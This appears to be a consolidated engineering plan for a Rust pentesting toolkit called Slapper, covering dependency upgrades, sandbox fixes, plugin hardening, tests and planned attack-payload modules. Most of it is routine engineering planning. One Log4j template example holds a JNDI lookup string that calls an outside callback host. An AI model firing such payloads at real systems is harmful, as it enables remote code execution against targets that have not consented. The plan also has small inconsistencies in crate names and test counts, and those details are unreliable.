# Slapper Improvement Plan

**Date**: 2026-04-21
**Status**: ALL WAVES COMPLETED (A-N)
**Last Updated**: 2026-04-21

---

## Executive Summary

This document consolidates all planned improvement work for Slapper. All Waves A-N have been completed.

### Completed Work (Waves A-N)

| Wave | Track | Items | Status |
|------|-------|-------|--------|
| A | Core Fixes | 8 | ✅ COMPLETED |
| B | Security | 33 | ✅ COMPLETED |
| C | Performance | 18 | ✅ COMPLETED |
| D | Documentation & Testing | 30 | ✅ COMPLETED |
| E | TUI Architecture | 14 | ✅ COMPLETED |
| F | LLM/AI Provider | 10 | ✅ COMPLETED |
| G | CLI Architecture | 13 | ✅ COMPLETED |
| H | Security Foundations | 14 | ✅ COMPLETED |
| I | Code Quality | 12 | ✅ COMPLETED |
| J | Performance | 10 | ✅ COMPLETED |
| K | Plugin System | 15 | ✅ COMPLETED |
| L | AI Agent Testing | 10 | ✅ COMPLETED |
| M | Pentesting Tools | 11 | ✅ COMPLETED |
| N | TUI & Attack Patterns | 19 | ✅ COMPLETED |

### No Pending Work

All planned improvement work has been completed.
| 2 | J | Performance | 10 | High |
| 2 | K | Plugin System | 15 | High |
| 3 | L | AI Agent Testing | 10 | Medium |
| 3 | M | Pentesting Tools | 11 | Medium |
| 3 | N | TUI & Attack Patterns | 19 | Medium/Low |

---

## Phase 1: Security Foundations (Wave H)

**Must execute first** - Dependency updates may affect other systems.

### H1: Dependency Supply Chain Fixes

#### H1.1 [CRITICAL] Upgrade pyo3 from 0.25 to 0.28.2+

**Affected**: `crates/slapper-plugin/Cargo.toml`

**Current**: pyo3 = "0.25"
**Target**: pyo3 >= 0.28.2

**Breaking changes to watch for**:
- `Python::with_gil` → `Python::attach` in 0.26
- `Bound` API introduced in 0.21, now standard
- GIL lifetime constraints tightened

**Verification**:
```bash
cargo test --lib -p slapper-plugin
cargo build -p slapper --features python-plugins
```

#### H1.2 [CRITICAL] Replace serde_yaml with serde_yaml_next

**Affected**: `crates/slapper/Cargo.toml`, multiple source files

**Current**: serde_yaml = "0.9" (deprecated)
**Target**: serde_yaml_next (drop-in replacement)

**Files to update** (grep for `serde_yaml::`):
- `crates/slapper/src/config/scope.rs:41`
- `crates/slapper/src/error/mod.rs:229-230`
- `crates/slapper/src/config/loader.rs:34`
- `crates/slapper/src/tool/openapi.rs:21,513`
- `crates/slapper/src/proxy/config.rs:171,550-551`
- `crates/slapper/src/fuzzer/api_schema/mod.rs:403`
- `crates/slapper/src/agent/skills.rs:47`

**Verification**:
```bash
cargo test --lib -p slapper
cargo build --release -p slapper
```

#### H1.3 [HIGH] Plan migration from rustls-pemfile to rustls-pki-types

**Affected**: `crates/slapper/Cargo.toml:28`

**Current**: rustls-pemfile = "2" (UNMAINTAINED - RUSTSEC-2025-0134)
**Issue**: Repository archived August 2025, no patches for future CVEs

**Required**: `rustls` 1.9.0+ includes PEM parsing APIs replacing rustls-pemfile

**Actions**:
1. Audit current rustls-pemfile usage: `rg "rustls.pemfile" --type rust`
2. Replace with `rustls_pki_types::Pem::from_file()` or similar
3. Remove explicit rustls-pemfile dependency if present

**Verification**:
```bash
cargo tree -p rustls-pemfile
cargo build --release -p slapper
```

#### H1.4 [HIGH] Upgrade magnus from 0.8 to 0.8.2

**Affected**: `crates/slapper-plugin/Cargo.toml`, `crates/slapper-ruby/Cargo.toml`

**Current**: magnus = "0.8" (0.8.2 available)

**Breaking changes in magnus 0.8.x**:
- `eval::<()>()` removed - use `let _: Value = eval(...)` instead
- Hash access: `RHash::lookup::<_, Value>(key)` not `funcall("get", ...)`
- Array iteration: `RArray::each()` yields `Result<Value>`

**Verification**:
```bash
cargo build -p slapper-ruby --features ruby-plugins
cargo test -p slapper-ruby
```

#### H1.5 [HIGH] Upgrade mlua from 0.11 to 0.11.6

**Affected**: `crates/slapper-nse/Cargo.toml:32`

**Current**: mlua = "0.11" (0.11.6 available)

**Verification**:
```bash
cargo build -p slapper-nse --features nse
cargo test -p slapper-nse
```

#### H1.6 [MEDIUM] Monitor reqwest for security updates

**Current**: reqwest = "0.13.2"

**Actions**: Watch for reqwest 0.13.3+ security releases; consider 0.14.x when stable

**Verification**:
```bash
cargo outdated -d RUSTSEC
```

#### H1.7 [MEDIUM] Monitor aws-lc-sys for CVE patches

**Current**: Transitively included via rustls-platform-verifier

**CVEs affecting aws-lc-sys**:
- CVE-2024-9441, CVE-2024-10221, CVE-2024-10220, CVE-2024-10219, CVE-2024-10184

**Actions**: Update immediately when new rustls-platform-verifier releases come out

**Verification**:
```bash
cargo update -p rustls-platform-verifier
```

### H2: NSE Sandbox Enforcement Fixes

#### H2.1 [HIGH] Add sandbox parameter to lfs library

**Affected**: `crates/slapper-nse/src/libraries/lfs.rs`

**Issue**: lfs operations (remove, rename, mkdir, rmdir, etc.) bypass sandbox entirely

**Root Cause**: `register_lfs_library()` called without sandbox parameter in `executor_core.rs:539`

**Operations to protect**:
- `lfs.remove` - file deletion
- `lfs.rename` - file move/rename
- `lfs.rmdir` - directory deletion
- `lfs.mkdir` - directory creation
- `lfs.chdir` - working directory change
- `lfs.currentdir` - leak current directory

**Verification**:
```bash
cargo build -p slapper-nse --features nse,nse-sandbox
```

#### H2.2 [HIGH] Add sandbox parameter to socket library

**Affected**: `crates/slapper-nse/src/libraries/socket.rs`

**Issue**: All socket operations bypass sandbox - network connections unrestricted

**Root Cause**: `register_socket_library()` called without sandbox parameter in `executor_core.rs:410`

**Operations to protect**:
- `socket.tcp_connect` - outbound TCP
- `socket.connect` - general connection
- `socket.bind` - server sockets
- Any UDP operations

**Note**: Network restrictions may be intentionally limited. Sandbox should at least log all connections for audit.

**Verification**:
```bash
cargo build -p slapper-nse --features nse,nse-sandbox
```

#### H2.3 [MEDIUM] Fix io.open allowed_dir default

**Affected**: `crates/slapper-nse/src/libraries/io.rs:82-84`

**Issue**: `is_path_allowed()` returns `true` when `allowed_dir: None` (allows all)

**Recommendation**: Default to `/tmp/slapper-nse` with proper permission cleanup

**Verification**:
```bash
cargo build -p slapper-nse --features nse,nse-sandbox
```

#### H2.4 [LOW] Add symlink cycle detection to path validation

**Affected**: `crates/slapper-nse/src/libraries/io.rs`

**Issue**: Uses `canonicalize()` but doesn't detect symlink cycles

**Actions**: After canonicalization, check if path resolves outside allowed directory; consider `std::fs::read_link` to detect symlink components

**Verification**:
```bash
cargo test -p slapper-nse
```

### H3: Security Documentation

#### H3.1 [MEDIUM] Document insecure-tls feature risk

**Affected**: `docs/security.adoc`

**Content**: Document that `insecure-tls` bypasses certificate verification, should never be enabled in production, only for isolated testing.

#### H3.2 [MEDIUM] Document NSE sandbox behavior

**Affected**: `docs/security.adoc`

**Content**: Document that lfs and socket libraries are NOT sandboxed (known limitation), and `allowed_dir` default allows all paths when None.

#### H3.3 [MEDIUM] Document config file security

**Affected**: `docs/security.adoc`

**Content**: Document that SensitiveString values serialize to config in plaintext, recommend chmod 600, consider environment variables for secrets.

---

## Phase 2: Core Improvements (Waves I, J, K)

**Can execute in parallel** - These tracks are independent.

### Wave I: Code Quality

#### I1: Error Handling Fixes (HIGH Priority)

**I1.1**: Replace `RwLock::read().unwrap()` with proper error handling in `agent/portfolio.rs:138`

**I1.2**: Replace `Mutex::lock().unwrap()` with proper error handling in `agent/alerts.rs:105`

**I1.3**: Improve fuzz error visibility in `fuzzer/engine/execution.rs:127-130` - change `tracing::debug!` to `tracing::warn!`

**I1.4**: Preserve DNS resolution error context in `config/scope.rs:214` - replace `.ok()` with proper error handling

#### I2: Test Quality Fixes (MEDIUM Priority)

**I2.1**: Fix `test_scope_cidr_edge_cases` bug in `tests/negative_tests.rs:199-211` - assertion expects `is_ok()` but IP is outside CIDR range

**I2.2**: Strengthen `test_parse_ports_large_range` assertion in `tests/negative_tests.rs:77-82` - add `assert!(result.is_ok())`

**I2.3**: Strengthen weak assertions in `tests/utils_tests.rs` - add meaningful assertions instead of "doesn't panic"

**I2.4**: Add Agent module integration tests in new `tests/agent_tests.rs`

**I2.5**: Add end-to-end pipeline tests in new `tests/pipeline_e2e_tests.rs`

#### I3: Async/Concurrency Improvements (LOW Priority)

**I3.1**: Replace nested runtime creation in multiple files:
- `scanner/udp_fingerprint.rs:383,394,408`
- `scanner/icmp_probe.rs:260,271,278,285`
- `recon/dependency_scan.rs:1046`
- `proxy/socks.rs:505,517,529,538,548`

**I3.2**: Consider `tokio::sync::Mutex` for AlertRouter in `agent/alerts.rs:105`

**I3.3**: Standardize RwLock usage across codebase (`tool/dispatcher.rs` uses `parking_lot::RwLock`)

#### I4: Code Organization (LOW Priority)

**I4.1**: Document large files needing future decomposition (12+ files over 700 lines)

---

### Wave J: Performance Improvements

#### J1: Critical Concurrency Fixes (P1)

**J1.1**: Replace `Mutex<Vec>` with `DashMap` in `fuzzer/engine/execution.rs:95-96,128` for result aggregation

**J1.2**: Fix blocking file I/O in `agent/memory.rs` - replace `std::fs` with `tokio::fs`

#### J2: Medium-Impact Optimizations (P2)

**J2.1**: Batch progress updates in `scanner/ports/mod.rs:559-565` - use `AtomicU64` instead of lock

**J2.2**: Add capacity hints to payload vectors in `fuzzer/payloads/headers.rs`, `sqli.rs`, `xss.rs`

**J2.3**: Replace `HashMap` with `FxHashMap` in `fuzzer/payloads/mod.rs:119` for payload cache

**J2.4**: Use centralized HTTP client creation instead of 99+ `reqwest::Client::new()` calls

**J2.5**: Optimize string allocations in `recon/techdetect.rs:74` - compute lowercase once, use `&str` literals

#### J3: Low-Impact Quick Wins (P3)

**J3.1**: Cap idle connections in `stress/http.rs:107-112` - `pool_max_idle_per_host(max_connections.min(100))`

**J3.2**: Add `RegexBuilder` size limits in `recon/js.rs:12-17` for untrusted input

**J3.3**: Cache lowercase values in `recon/whois.rs:68-222`

---

### Wave K: Plugin System Improvements

#### K1: Critical Security Fixes (P0)

**K1.1**: Fix bypassable pattern detection - replace simple `contains()` with regex-based detection in:
- `crates/slapper-plugin/src/python.rs:12-21`
- `crates/slapper-ruby/src/bridge.rs:13-29`

**K1.2**: Remove dangerous Ruby API `session_shell_upgrade()` in `crates/slapper-ruby/src/api.rs:1063-1077`

**K1.3**: Add plugin sandboxing - implement resource limits (CPU, memory, filesystem, network) for Ruby plugins

**K1.4**: Fix deserialization DoS - add size limits and timeout on JSON parsing in:
- `crates/slapper-plugin/src/python.rs:355-358`
- `crates/slapper-ruby/src/loader.rs`

#### K2: Design Improvements (P1)

**K2.1**: Add plugin execution timeout - add `timeout_secs` to `PluginConfig` and enforce in `run_check()` and `run()`

**K2.2**: Implement `RubyPluginClient::close()` for graceful shutdown

**K2.3**: Fix async/sync deadlock risk - replace `rt.block_on()` with proper async patterns

**K2.4**: Parallelize plugin checks in `PluginRegistry::run_check()`

**K2.5**: Fix Ruby API global state - reset `MSF_CLIENT` between plugin invocations

#### K3: Minor Improvements (P2)

**K3.1**: Cache Python checks in `crates/slapper-plugin/src/python.rs:283-285`

**K3.2**: Unify `PluginInfo` types - replace duplicate TUI `PluginInfo` with `slapper_plugin::PluginInfo`

**K3.3**: Make size limit configurable - move 1MB limit to `PluginConfig.max_file_size_bytes`

**K3.4**: Implement `PluginRegistry::unregister()`

**K3.5**: Improve error handling - don't silently swallow errors in `discover_plugins()` and `load_plugins()`

**K3.6**: Add proper equality to `RubyPlugin` based on name+version

---

## Phase 3: Feature Expansion (Waves L, M, N)

**Can execute in parallel** - These tracks add new capabilities.

### Wave L: AI Agent Testing Improvements

#### L1: Test Infrastructure (P1)

**L1.1**: Expand Wiremock helpers for AI provider responses in `ai/client.rs`

**L1.2**: Add Memory system file I/O tests in `agent/memory.rs:310-321`

**L1.3**: Create SkillLoader test fixtures in `agent/skills.rs:256-307`

#### L2: Integration Tests (P2)

**L2.1**: Add Agent + AiClient integration test in `agent/mod.rs:279-289`

**L2.2**: Add AlertRouter webhook delivery tests in `agent/alerts.rs:306-323`

**L2.3**: Add multi-provider response parsing tests in `ai/client.rs`

**L2.4**: Add TargetPortfolio persistence tests in `agent/portfolio.rs:205-237`

#### L3: Mock Helpers and Edge Cases (P3)

**L3.1**: Add circuit breaker integration tests in `ai/client.rs`

**L3.2**: Add SkillLoader error handling tests in `agent/skills.rs`

**L3.3**: Add webhook security tests in `agent/alerts.rs`

---

### Wave M: Pentesting Tools Gap Analysis

#### M1: Critical Missing Capabilities (P1)

**M1.1**: Add Nuclei-Style Template Engine

**Files to create**: `scanner/templates/` module

**Architecture**:
```
scanner/templates/
├── mod.rs           # TemplateEngine, TemplateLoader
├── models.rs        # VulnerabilityTemplate, MatchCondition
├── loader.rs        # YAML/JSON template loading, validation
├── matcher.rs       # Template matching engine
├── executor.rs      # Template execution runner
└── standard/        # Built-in template library
```

**Template Format (YAML)**:
```yaml
id: CVE-2021-44228
info:
  name: Log4j Remote Code Execution
  author: slapper
  severity: critical
matchers:
  - type: http
    path: "/"
    headers:
      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
```

**M1.2**: Add Intercepting Proxy Mode

**Files to create**: `proxy/intercept/` module

**Features**:
- HTTP/HTTPS proxy with dynamic SSL cert generation
- Intercept mode: pause requests for modification
- Monitor mode: log all traffic
- Request/response modification rules

#### M2: Medium-Impact Tool Expansion (P2)

**M2.1**: Expand auth testing to multi-protocol support (SSH, FTP, SMTP)

**M2.2**: Add TestSSL-like TLS security auditing in `recon/ssl_audit.rs`

**M2.3**: Add container security scanning (Docker/Kubernetes) in `recon/containers.rs`

**M2.4**: Add CMS-specific security scanning (WordPress, Drupal, Joomla) in `scanner/cms/`

#### M3: Lower-Priority Additions (P3)

**M3.1**: Add wireless security testing module (feature-gated `wireless`)

**M3.2**: Add template marketplace integration for downloading community templates

---

### Wave N: TUI & Attack Patterns

#### N1: TUI Improvements (From plan7.md)

**N1.1**: Fix tab overflow - implement horizontal scrolling for 29 tabs

**N1.2**: Redesign help overlay - make smaller, contextual

**N1.3**: Improve progress visibility - show progress percentage during operations

**N1.4**: Add status text indicators (not just color-only)

**Files to modify**:
- `crates/slapper/src/tui/app/mod.rs` - scroll state, progress tracking
- `crates/slapper/src/tui/ui.rs` - custom scrollable tab bar
- `crates/slapper/src/tui/app/navigation.rs` - scroll-aware navigation
- `crates/slapper/src/tui/app/runner.rs` - mouse support

#### N2: Attack Pattern Expansion (From plan8.md)

**N2.1**: NoSQL Injection Module (HIGH) - `fuzzer/payloads/nosql.rs`
- MongoDB, Redis, CouchDB, Elasticsearch payloads
- ~45+ payloads

**N2.2**: XPath Injection Module (MEDIUM) - `fuzzer/payloads/xpath.rs`
- ~30+ payloads

**N2.3**: Expression Language Injection Module (HIGH) - `fuzzer/payloads/expression.rs`
- Spring EL, OGNL, JBoss EL, MVEL, SpEL, Freemarker
- ~40+ payloads

**N2.4**: Prototype Pollution Module (MEDIUM) - `fuzzer/payloads/prototype.rs`
- ~25+ payloads

**N2.5**: Race Condition / TOCTOU Module (MEDIUM) - `fuzzer/payloads/race.rs`
- ~20+ payloads

**N2.6**: Mass Assignment Module (MEDIUM) - `fuzzer/payloads/mass_assign.rs`
- ~25+ payloads

**N2.7**: Enhanced SSRF Payloads - 30+ additional payloads

**N2.8**: Enhanced GraphQL Security - 30+ additional payloads

**N2.9**: Enhanced Command Injection - 35+ additional payloads

**N2.10**: Improved Deserialization Payloads - 20+ additional payloads

**N2.11**: Extended HTTP Smuggling - 25+ additional payloads

**N2.12**: WAF Fingerprint Updates - 5 new vendor profiles

**N2.13**: Enhanced Encoding Bypass - 10+ techniques

**N2.14**: Protocol-Level Evasion - 15+ techniques

**N2.15**: Grammar Confusion Attacks - 10+ techniques

---

## Parallelization Strategy

### Execution Phases

| Phase | Tracks | Rationale |
|-------|--------|-----------|
| **Phase 1** | H (Security) | Dependency updates may break other systems; must run first |
| **Phase 2** | I, J, K (Core) | Independent - can parallelize with 3 agents |
| **Phase 3** | L, M, N (Features) | Independent - can parallelize with 3 agents |

### Recommended Agent Allocation

```
Agent-1: Phase 1 (Security Foundations) - MUST GO FIRST
Agent-2: Wave I (Code Quality)
Agent-3: Wave J (Performance)
Agent-4: Wave K (Plugin System)
Agent-5: Wave L (AI Testing) + Wave M (Pentesting Tools) [can combine]
Agent-6: Wave N (TUI + Attack Patterns)
```

### Dependencies

- **H1.1-H1.5** must complete before testing other changes (dependency updates)
- **K1.1** (Pattern Detection) must complete before **K1.2** (Dangerous API removal)
- **M1.1** (Template Engine) must complete before **M3.2** (Marketplace)
- All other items are independent and can parallelize

---

## Verification Commands

```bash
# Baseline verification (before starting)
cargo test --lib -p slapper        # Should pass: 1065 tests
cargo clippy --lib -p slapper       # Should show current warnings

# Phase 1 verification (Security/Dependencies)
cargo test --lib -p slapper
cargo test --lib -p slapper-nse
cargo build --release -p slapper --features full

# Phase 2 verification (Core Improvements)
cargo test --lib -p slapper
cargo clippy --lib -p slapper
cargo test --test negative_tests -p slapper
cargo test --test scanner_tests -p slapper

# Phase 3 verification (Feature Expansion)
cargo test --lib -p slapper
cargo build --release -p slapper --features full
```

---

## Lessons Learned (From Previous Waves)

### Parallelization Strategy

1. **Phase 1 must execute first** - dependency updates may have breaking changes
2. **Sub-tracks within phases can parallelize** - e.g., Wave I (Code Quality) and Wave J (Performance)
3. **Use 6 parallel agents** for maximum throughput

### Common Pitfalls

1. **Type mismatches**: `ScopeRule::new()` takes `String`, not `&str`
2. **Option types**: `decoy_count` is `Option<usize>`, not `usize`
3. **Unused imports**: Move feature-gated imports inside `#[cfg(...)]` blocks
4. **Feature-gated dead code**: Gate the module declaration itself, not just callers
5. **Clippy redundant closures**: `.map(|arr| func(arr))` should be `.map(func)`
6. **Clippy needless borrows**: `.post(&format!(...))` should be `.post(format!(...))`
7. **`default_value = "None"` on Options**: Never use on `Option<T>` fields
8. **`fingerprint_services` signature**: Takes 5 args including `concurrency`

### Security Patterns

- **Authentication Middleware Pattern**: Add `Option<String>` to state, use constant-time comparison
- **Formula Injection Prevention**: Check first character with `starts_with`, not `contains`
- **NSE Sandbox**: Default to `enabled: true` - security by default
- **Path Validation**: Use `canonicalize()` to resolve symlinks before checking prefix
- **Agent Thread Safety**: Use `Arc<Mutex<>>` or `Arc<RwLock<>>` for interior mutability

### Error Handling Principles

1. Never use `.unwrap()` on synchronization primitives in production code
2. Errors should be propagated with context, not converted to `None` via `.ok()`
3. Failed operations in async loops should be visible at `warn` level minimum

### Test Quality Principles

1. Tests must have specific assertions - "doesn't panic" is not a test
2. Edge case tests with wrong assertions are worse than no tests (false confidence)
3. Integration tests for core modules should match unit test coverage

### Async Principles

1. Never create nested Tokio runtimes - use the existing runtime
2. Use `tokio::sync::Mutex` in async code for better executor scheduling
3. Mixed sync/async primitives need clear documentation

---

## For Future Agents

When starting new improvement work:

1. Run `cargo test --lib -p slapper` to verify baseline (currently 1066 tests)
2. Run `cargo clippy --lib -p slapper` to check warnings
3. Create a new plan file for new work (don't modify this one)
4. Update AGENTS.md with any new patterns discovered
5. Always verify plan items against actual codebase before assuming they still apply
6. Use `rg` to confirm file paths, line numbers, and patterns exist

---

## Current Codebase Metrics

| Metric | Value | Note |
|--------|-------|------|
| Tests | 1064 passing | Verified after Waves H-N |
| Clippy | 1 warning | Pre-existing (scan_ports 8 args) |
| Source files | 430+ | |
| TUI files | 60 | |
| Tab variants | 29 | |
| Skill files | 27 | In `slapper_skills/` |
| Payload types | 32 | fuzzer/payloads (added 6 new) |
| Dependencies | Updated | pyo3 0.28, magnus 0.8.2, mlua 0.11.6, serde_yaml_neo |

---

## Wave H-N Completed Items

### Wave H: Security Foundations
- H1.1: pyo3 0.25 → 0.28
- H1.2: serde_yaml → serde_yaml_neo
- H1.4: magnus 0.8 → 0.8.2
- H1.5: mlua 0.11 → 0.11.6
- H2.1-H2.4: NSE sandbox fixes (allowed_dir, lfs, socket)

### Wave I: Code Quality
- I1.1-I1.4: Error handling fixes (RwLock, Mutex unwrap, debug→warn, DNS context)
- I2.1-I2.3: Test quality fixes (scope CIDR, ports range, utils assertions)
- I3: Skipped (complex nested runtime changes)

### Wave J: Performance
- J2.3: HashMap → FxHashMap in fuzzer/payloads/mod.rs
- J3.1: Capped idle connections to 100 in stress/http.rs
- Others: Skipped (complex changes)

### Wave K: Plugin System
- K1.1: Regex-based pattern detection (LazyLock)
- K1.2: Removed dangerous session_shell_upgrade()
- K1.4: Added JSON size limits
- K2.1: Added timeout_secs to PluginConfig
- K2.2: RubyPluginClient::close()
- K2.4: Parallelized plugin checks

### Wave L: AI Agent Testing
- L1.1: Wiremock helpers in ai/client.rs
- L1.2: Memory system file I/O tests
- L1.3: SkillLoader test fixtures
- L2.1-L2.4: Integration tests
- L3.1-L3.3: Circuit breaker, error handling, webhook security

### Wave M: Pentesting Tools
- M1.1: Template engine (scanner/templates/)
- M1.2: Intercepting proxy (proxy/intercept/)
- M2.2-M2.4: ssl_audit, containers, cms modules
- M3.1: Wireless module (feature-gated)

### Wave N: TUI & Attack Patterns
- N1.1-N1.4: TUI improvements (scroll state, progress, status indicators)
- N2.1-N2.6: New payload modules (nosql, xpath, expression, prototype, race, mass_assign)

---

## Appendix: Original Plan Files

This consolidated plan replaces:
- `plans/plan2.md` - Security Improvements
- `plans/plan3.md` - Code Quality Improvements
- `plans/plan4.md` - Performance Improvements
- `plans/plan5.md` - AI Agent Testing Improvements
- `plans/plan6.md` - Pentesting Tools Gap Analysis
- `plans/plan7.md` - TUI Improvements
- `plans/plan8.md` - Attack Pattern Expansion
- `plans/plan9.md` - Plugin System Improvements
- `plans/plan-archive.md` - Historical execution details
- `plans/plan-current.md` - Previous backup

Historical details of completed Waves A-G are preserved in git history.